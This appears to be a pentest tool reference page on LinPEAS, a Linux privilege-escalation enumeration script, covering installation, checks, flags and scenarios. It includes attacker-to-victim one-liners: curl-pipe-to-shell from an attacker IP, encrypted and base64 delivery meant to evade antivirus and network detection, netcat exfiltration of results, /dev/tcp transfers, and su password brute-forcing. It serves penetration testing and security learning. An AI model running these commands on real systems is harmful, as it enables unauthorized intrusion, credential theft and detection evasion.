---
title: "PEASS-ng (LinPEAS)"
description: "Privilege Escalation Awesome Scripts Suite — next generation. Automated enumeration of privilege escalation vectors on Linux, macOS, and Unix systems."
category: "privilege-escalation"
tool_name: "peass"
mitre_tactic: "privilege_escalation"
mitre_tactic_id: "TA0004"
difficulty: "beginner"
os: ["linux", "macos", "unix"]
language: ["shell", "python"]
license: "MIT"
kali_path: "/usr/share/peass-ng/linpeas"
github: "https://github.com/peass-ng/PEASS-ng"
official_docs: "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
install_command: "sudo apt install peass-ng"
---

# PEASS-ng (LinPEAS)

PEASS-ng — Privilege Escalation Awesome Scripts Suite, new generation — is the most comprehensive automated privilege escalation enumeration toolkit available. It covers Linux, macOS, and Unix systems, searching for misconfigurations, vulnerable software, credential leaks, SUID binaries, container escapes, and kernel exploits. Color-coded output highlights probable escalation paths in red/yellow.

## 1. Overview

**What It Does:** LinPEAS runs 300+ checks across the system — users, groups, processes, cron jobs, services, network, files, software, capabilities, and kernel version — then highlights anything that could lead to higher privileges. It does NOT exploit anything; it finds paths for you to exploit manually.

**Why It Matters:** Manual enumeration is slow and error-prone. LinPEAS automates the full OSCP/Linux privilege escalation checklist in a single run. Every finding includes a link to the corresponding HackTricks wiki page explaining the exploitation technique.

**Key Distinction:** Unlike unix-privesc-check (which is a simple shell script with basic checks), LinPEAS performs deep enumeration including password brute-forcing with `su`, process monitoring for transient cron jobs, firmware analysis, network scanning, and regex-based API key/secret detection.

**Architecture:** LinPEAS is distributed as a single POSIX shell script. It has zero external dependencies — it uses only built-in shell commands (`find`, `grep`, `cat`, `ls`, `ps`, `awk`, `sed`). A pre-compiled Go binary variant exists for environments where shell execution is restricted.

**Supported Platforms:** Tested on Debian, CentOS, Ubuntu, Fedora, Arch, FreeBSD, OpenBSD, and macOS. Works on any system with a POSIX-compliant `/bin/sh`.

## 2. Installation & Access

### On Kali Linux

```bash
sudo apt install peass-ng
```

**Explanation:** The `peass-ng` package installs both linPEAS and winPEAS into `/usr/share/peass-ng/`. The package is included in the `kali-linux-large` and `kali-linux-everything` metapackages.

### Direct Download from GitHub

```bash
# From GitHub releases (latest stable)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
```

**Explanation:** Direct download works when the Kali package is outdated or unavailable. The `-L` flag follows redirects from GitHub releases.

### Pre-built Go Binary (No Shell Dependencies)

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

**Explanation:** The Go binary compiles everything into a single executable with no shell dependency. Use this when `/bin/sh` is restricted, the system uses a non-standard shell, or you need to avoid shell-based detection.

### Build Custom LinPEAS

```bash
# Clone the builder
git clone https://github.com/peass-ng/PEASS-ng.git
cd PEASS-ng/linPEAS/builder

# Build with only selected checks
python3 builder.py -c system_information,users_information,interesting_files
```

**Explanation:** The builder lets you select which checks to include, creating a smaller, faster, and stealthier script. Useful for targeted engagements where you know which vectors to check.

## 3. Output Versions

LinPEAS ships three variants with different trade-offs.

**linpeas.sh** — Default version. All standard checks. Includes Linux Exploit Suggester embedded in base64. Size: ~2MB. Run time: 4 minutes.

**linpeas_fat.sh** — Full version with all third-party tools embedded in base64 (LinEnum, linux-exploit-suggester, and others). Size: ~5MB. Run time: 5-8 minutes. Fully self-contained.

**linpeas_small.sh** — Critical checks only. No third-party tools. Size: ~500KB. Run time: 1-2 minutes. Fastest and stealthiest.

### When to Use Each Version

| Version | Use Case |
|---|---|
| **linpeas.sh** | General purpose, CTFs, standard pentest |
| **linpeas_fat.sh** | Isolated systems with no internet, full offline capability |
| **linpeas_small.sh** | Stealth assessments, production environments, quick scans |

## 4. Check Categories in Detail

### System Information

Checks OS version, kernel version, architecture, hostname, SELinux/AppArmor status, ASLR configuration, and compiler availability. This section establishes the baseline for kernel exploit checks later.

```bash
# Manual equivalent
uname -a
cat /etc/os-release
getenforce 2>/dev/null
aa-status 2>/dev/null
cat /proc/sys/kernel/randomize_va_space
which gcc cc make 2>/dev/null
```

### Container and Cloud Detection

Detects if running inside Docker, LXC, Podman, or Kubernetes. Checks for cloud metadata endpoints (AWS, GCP, Azure). Identifies container escape vectors.

```bash
# Manual equivalent
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null
```

### Processes, Cron, Timers, Services, and Sockets

Enumerates running processes with ownership, monitors for transient cron jobs (1-minute observation window with `-a`), checks systemd timers, lists services with binary paths, and identifies network sockets.

```bash
# Manual equivalent
ps auxf
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all
systemctl list-units --type=service
ss -tlnp
```

### Network Information

Checks IP configuration, routing tables, ARP cache, firewall rules (iptables, nftables, firewalld), DNS configuration, and active connections. The `-d`, `-p`, `-i`, and `-t` flags enable active host discovery and port scanning from the compromised host.

```bash
# Manual equivalent
ip a
ip r
arp -a
iptables -L -n
cat /etc/resolv.conf
ss -tulnp
```

### Users and Information

Lists all users, groups, sudo permissions, login shells, home directories, and current logins. Checks for empty passwords in `/etc/passwd`, readable `/etc/shadow`, and SSH key locations.

```bash
# Manual equivalent
cat /etc/passwd
cat /etc/group
sudo -l
w
last
find /home -name "authorized_keys" -o -name "id_rsa" 2>/dev/null
```

### Software and Information

Enumerates installed packages, available compilers, useful binaries (nc, python, perl, ruby, wget, curl), and version information. Cross-references against known vulnerable versions.

```bash
# Manual equivalent
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
which python python3 perl ruby php gcc make wget curl nc ncat socat 2>/dev/null
```

### Interesting Files

Searches for SUID/SGID binaries, world-writable files, readable sensitive files (`/etc/shadow`, SSH keys, password files), backup files, configuration files with credentials, and history files.

```bash
# Manual equivalent
find / -perm -4000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -writable -type f 2>/dev/null
cat /etc/shadow 2>/dev/null
find /home -name ".bash_history" -o -name ".ssh" 2>/dev/null
```

### API Keys and Regex

Scans the entire filesystem for API keys and secrets using regex patterns. Detects AWS access keys, Azure storage keys, GCP service account keys, GitHub tokens, Stripe keys, Slack tokens, and hundreds more. Enabled with `-r` flag.

```bash
# Regex patterns checked
AKIA[0-9A-Z]{16}           # AWS Access Key
ghp_[a-zA-Z0-9]{36}        # GitHub Personal Access Token
sk_live_[a-zA-Z0-9]{24,}   # Stripe Secret Key
AIza[0-9A-Za-z_-]{35}      # Google API Key
```

## 5. Usage Examples

### Basic Enumeration (CTF/HackTheBox)

```bash
./linpeas.sh -a
```

**Explanation:** The `-a` flag enables all checks including user brute-force with top-2000 passwords via `su` and 1-minute process monitoring for transient cron jobs. Essential for CTFs where noise does not matter.

### Stealth Mode (Production Assessment)

```bash
./linpeas.sh -s
```

**Explanation:** The `-s` (stealth) flag skips time-consuming checks, writes nothing to disk, and avoids the `su` brute-force. Use this in production environments where you need minimal footprint and no authentication logs.

### Targeted Checks Only

```bash
./linpeas.sh -o system_information,users_information,interesting_files
```

**Explanation:** The `-o` parameter accepts a comma-separated list of check categories. Run only what you need — faster output, less noise, focused results.

### Complete Scan with Regex

```bash
./linpeas.sh -a -r
```

**Explanation:** The `-r` flag enables regex-based scanning for hundreds of API keys across the filesystem. Can take minutes to hours depending on disk size. Combined with `-a` gives the most thorough scan possible.

### Pass Known Password

```bash
./linpeas.sh -P "Password123"
```

**Explanation:** The `-P` flag passes a known password for `sudo -l` execution and user brute-force via `su`. Use this when you already have one user's password and want to find lateral movement paths.

### Output to File with Colors Preserved

```bash
./linpeas.sh -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt
```

**Explanation:** Redirect output to a file, then use `less -r` to view ANSI color codes. LinPEAS uses red/yellow for high-confidence PE vectors, red for suspicious findings, green for known-good. The `/dev/shm` directory is tmpfs — fast and often not monitored.

### Execute from Memory (AV Bypass)

```bash
# On attacker machine
sudo python3 -m http.server 8000

# On victim — curl pipe to shell
curl http://10.10.14.20:8000/linpeas.sh | sh
```

**Explanation:** Pipe directly from HTTP to shell. No file hits disk. The script runs entirely in memory. Avoids file-based AV scanning.

### AES-Encrypted Transfer

```bash
# On attacker — encrypt
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:MySecret -in linpeas.sh -out lp.enc
sudo python3 -m http.server 8000

# On victim — download, decrypt, execute
curl 10.10.14.20/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:MySecret | sh
```

**Explanation:** AES-256-CBC encryption defeats network-level signature detection (IDS/IPS, DLP). The script is never in plaintext on the wire.

### Base64 Transfer

```bash
# On attacker
base64 -w0 linpeas.sh > lp.enc
sudo python3 -m http.server 8000

# On victim
curl 10.10.14.20/lp.enc | base64 -d | sh
```

**Explanation:** Base64 encoding avoids special character issues in HTTP transfers and some DLP solutions that inspect for shell script patterns.

### Send Output Back to Attacker

```bash
# On attacker
nc -lvnp 9002 | tee linpeas.out

# On victim
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
```

**Explanation:** Execute and exfiltrate results simultaneously. Useful when the victim has outbound connectivity but no interactive shell for receiving the output.

### Python HTTP Server with SMB Fallback

```bash
# Python server (if curl is missing, wget works)
sudo python3 -m http.server 8000
wget http://10.10.14.20:8000/linpeas.sh -O /dev/shm/lp.sh && sh /dev/shm/lp.sh

# SMB share (if HTTP is blocked)
impacket-smbserver share . -smb2support
cat //10.10.14.20/share/linpeas.sh | sh
```

### Firmware Analysis Without Emulation

```bash
# Option 1: Run inside emulated firmware
cp /path/to/linpeas.sh /mnt/linpeas.sh
chroot /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex

# Option 2: Analyze filesystem directory
bash linpeas.sh -f /path/to/extracted/firmware/rootfs
```

**Explanation:** The `-f` flag analyzes file permissions and secrets in a directory tree without needing a running system. Useful for IoT firmware analysis.

### Network Discovery from Compromised Host

```bash
# Discover hosts and scan ports from the victim
./linpeas.sh -d 192.168.1.0/24 -p 22,80,443,445,3389

# Port forwarding through victim
./linpeas.sh -F 127.0.0.1:8080:192.168.1.50:80
```

**Explanation:** Uses `fping`, `ping`, or `nc` to discover hosts and scan ports. Output shows live hosts and open services for lateral movement. The `-F` flag creates a port forward from the victim to a remote target.

## 6. Color Coding System

Understanding LinPEAS output colors is critical for efficient analysis.

| Color | Meaning | Action |
|---|---|---|
| **Red on Yellow** | High-confidence PE vector (99% exploitable) | Investigate immediately |
| **Red** | Suspicious configuration | Manual analysis required |
| **Green** | Known good configuration (by name only) | Low priority |
| **Blue** | Informational (users without shell, mounted devices) | Note for context |
| **Light Cyan** | Users with login shell | Note for target selection |
| **Light Magenta** | Current username highlight | Orientation aid |

**Caveat:** Green means "name looks standard" — it does NOT verify content. A file named `authorized_keys` could contain attacker keys and still show green. Always verify manually.

**Caveat:** Red/Yellow does not guarantee exploitability. A SUID binary with capabilities may require specific input that is not available in the current context. Manual verification is always required.

## 7. Practical Scenarios

### Scenario 1: CTF Box — Initial Access Gained

After obtaining a low-privilege shell on `192.168.1.100`:

```bash
# Transfer and run full enumeration
curl -L http://192.168.1.200:8000/linpeas.sh | sh
```

**Look for:** Red/Yellow highlights — especially sudo misconfigs, SUID binaries, writable cron scripts, capabilities.

**Expected runtime:** 4-10 minutes with `-a`.

### Scenario 2: Production Server — Authorized Assessment

```bash
# Stealth mode, targeted checks, output to file
./linpeas.sh -s -o users_information,procs_crons_timers_srvcs_sockets,interesting_files > /dev/shm/enum.txt 2>&1
```

**Look for:** Service binary paths, cron scripts, SUID binaries, readable credentials.

**Expected runtime:** 30-60 seconds.

### Scenario 3: Container Escape Assessment

```bash
# Check if inside Docker/LXC
./linpeas.sh -o container,users_information,interesting_files | grep -A5 -i "docker\|container\|lxc"
```

**Look for:** `docker` group membership, `/proc/1/cgroup` container indicators, writable Docker socket, SUID binaries inside container, capability `cap_sys_admin`.

### Scenario 4: Firmware Analysis Without Emulation

```bash
# Point linpeas at extracted firmware filesystem
bash linpeas.sh -f /path/to/extracted/firmware/rootfs -o software_information,interesting_files,api_keys_regex
```

**Explanation:** The `-f` flag analyzes file permissions and secrets in a directory tree without needing a running system.

### Scenario 5: Network Discovery from Compromised Host

```bash
# Discover hosts and scan ports from the victim
./linpeas.sh -d 192.168.1.0/24 -p 22,80,443,445,3389
```

**Explanation:** Uses `fping`, `ping`, or `nc` to discover hosts and scan ports. Output shows live hosts and open services for lateral movement.

### Scenario 6: macOS Assessment

```bash
# LinPEAS automatically detects macOS and runs MacPEAS
curl -L http://10.10.14.20:8000/linpeas.sh | sh
```

**Look for:** Homebrew SUID binaries, macOS-specific privilege escalation paths, Keychain access, FDE status, Gatekeeper configuration.

### Scenario 7: FreeBSD/OpenBSD Assessment

```bash
# LinPEAS supports BSD systems
curl -L http://10.10.14.20:8000/linpeas.sh | sh
```

**Look for:** BSD-specific SUID paths, `/etc/rc.conf` service configurations, BSD jail escapes.

### Scenario 8: Minimal Shell (No curl, No wget)

```bash
# Use netcat to transfer
# On attacker
sudo nc -q 5 -lvnp 80 < linpeas.sh

# On victim
cat < /dev/tcp/10.10.14.20/80 > /dev/shm/lp.sh
sh /dev/shm/lp.sh
```

**Explanation:** When `curl` and `wget` are unavailable, netcat or bash's `/dev/tcp` pseudo-device provides a transfer mechanism.

## 8. Post-Enumeration Analysis

After LinPEAS completes, follow this workflow:

### Step 1: Extract All Warnings

```bash
grep -E "Red|WARNING|PE FOUND" /dev/shm/linpeas.txt
```

### Step 2: Categorize Findings

| Category | Priority | Examples |
|---|---|---|
| **Direct PE** | Critical | SUID bash, writable /etc/passwd, sudo NOPASSWD ALL |
| **Sudo Misconfig** | High | GTFOBins-exploitable sudo entries |
| **Cron Abuse** | High | Writable cron scripts, PATH hijacking |
| **Capability Abuse** | High | cap_setuid on interpreters |
| **Service Misconfig** | Medium | Writable service binaries, unquoted paths |
| **Stored Credentials** | Medium | SSH keys, password files, history |
| **Kernel Exploit** | Low-Medium | Old kernel with known exploit |
| **Container Escape** | Variable | Docker socket, LXC group, capability abuse |

### Step 3: Verify Each Finding

Never exploit without verification. Check:

1. Can you actually write to the claimed file?
2. Is the SUID binary actually exploitable with your user?
3. Is the cron script actually run by root?
4. Is the capability actually grantable?

### Step 4: Exploit

Use GTFOBins (https://gtfobins.github.io/) for Linux exploitation techniques.

## 9. Limitations and Caveats

**No Exploitation:** LinPEAS finds paths but does not exploit them. You must manually verify and exploit each finding.

**Noise Level:** The `-a` flag runs `su` brute-force against every user with the top-2000 password list. This generates authentication logs and may trigger account lockouts. Avoid in production without explicit permission.

**False Negatives:** LinPEAS checks by name/pattern, not semantic analysis. Custom binaries, non-standard paths, or compiled-in configurations may be missed.

**False Positives:** Red/Yellow highlighting does not guarantee exploitability. A SUID binary with capabilities may require specific input that is not available in the current context.

**Dependency on /bin/sh:** The shell script version requires a POSIX-compliant `/bin/sh`. If the target uses a restricted shell, use the Go binary instead.

**Firmware Limitations:** When using `-f` for firmware analysis, only file-based checks run. Process, network, and kernel checks are skipped.

**Time:** Full scan (`-a -r`) can take 10+ minutes. On slow systems, use `-s` or `-o` for targeted checks.

**Logging:** Every check generates system logs (auth.log, syslog, bash_history). Assume blue team visibility.

**Regex Mode:** The `-r` flag can take hours on large filesystems. Only use when thoroughness is required.

**Disk Space:** LinPEAS writes nothing to disk by default. The `-a` process monitoring writes a temporary file that is deleted after execution.

## 10. Resources

- **GitHub Repository:** https://github.com/peass-ng/PEASS-ng
- **HackTricks Linux Privilege Escalation:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- **HackTricks Training Course:** https://hacktricks-training.com/courses/lhe/
- **LinPEAS Builder (Custom Checks):** https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS/builder
- **PEASS Releases:** https://github.com/peass-ng/PEASS-ng/releases/latest
- **HackTricks Linux PE Checklist:** https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- **GTFOBins:** https://gtfobins.github.io/
- **Linux Exploit Suggester:** https://github.com/The-Z-Labs/linux-exploit-suggester
